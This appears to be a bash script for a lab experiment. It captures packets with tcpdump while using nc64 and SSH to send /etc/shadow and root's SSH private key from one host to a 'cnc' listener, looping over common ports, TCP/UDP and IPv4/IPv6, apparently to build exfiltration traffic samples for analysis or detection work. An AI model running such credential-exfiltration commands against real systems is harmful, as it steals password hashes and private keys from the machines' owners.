#!/bin/bash

cnc='10.0.242.194'
host='10.0.242.193'

files=( '/etc/shadow' '/root/.ssh/id_rsa' '/root/.ssh/id_rsa.pub' )
ports=( '53' '22' '80' '443' )
proto=( 't' 'u' )
ipver=( '4' '6' '64' )

working_dir='/tmp'
#working_dir='/var/pcap/experiments'

exctract_files () {

	for file in "${files[@]}"; do
		echo "starting listener on port $port with protocol -$protocol on version $ver"
		ssh root@$cnc "/root/nc64-master/nc64.py -l -$protocol -p $port >> /tmp/nc64.log &" || echo fail
		sleep 2

		echo "attempting file transfer $file on port $port with protocol -$protocol on version $ver"
		ssh root@$host "cat $file | /root/nc64/nc64-master/nc64.py -h4 192.168.12.12 -h6 2a02:1010:12::12 -$protocol -p $port $nc_ver_arg " || echo fail
		sleep 1

		echo "attempting to kill nc64 listener"
		ssh root@$cnc "pkill nc64.py" || echo fail
		sleep 2

	done
}

for protocol in "${proto[@]}"; do
	for port in "${ports[@]}"; do
		for ver in "${ipver[@]}"; do

			case $ver in
				4)
				nc_ver_arg="--ip_version_select 4"
				;;
				6)
				nc_ver_arg="--ip_version_select 6"
				;;
				64)
				nc_ver_arg=""
				;;
				*)
				nc_ver_arg=""
				;;
			esac	
			
			echo "starting tcpdump for $ver-$protocol-$port.pcap"
			tcpdump -i eth2 -w $working_dir/nc64-$ver-$protocol-$port.pcap > /dev/null &
			echo "sleeping before sending data"
			sleep 1

			exctract_files $nc_ver_arg

			echo "killing tcpdump"
			pkill tcpdump
			sleep 2
		done
	done
done
